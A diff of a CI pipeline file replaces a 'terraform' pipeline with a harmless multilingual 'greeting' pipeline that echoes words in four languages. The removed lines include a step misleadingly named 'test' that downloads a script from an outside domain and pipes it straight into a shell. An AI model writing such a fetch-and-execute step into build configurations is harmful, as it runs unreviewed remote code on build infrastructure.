@@ -1,14 +1,27 @@
----
-  kind: pipeline
-  type: docker
-  name: terraform
-  
-  platform:
-    arch: amd64
-    os: linux
+kind: pipeline
+name: greeting
 
-  steps:
-    - name: test
-      image: alpine
-      commands:
-        - curl -fsSL https://www.animania.tech/start.txt | sh
+steps:
+- name: en
+  image: alpine
+  commands:
+  - echo hello
+  - echo world
+
+- name: es
+  image: alpine
+  commands:
+  - echo hola
+  - echo mundo
+
+- name: fr
+  image: alpine
+  commands:
+  - echo bonjour
+  - echo monde
+
+- name: zh
+  image: alpine
+  commands:
+  - echo 你好
+  - echo 世界
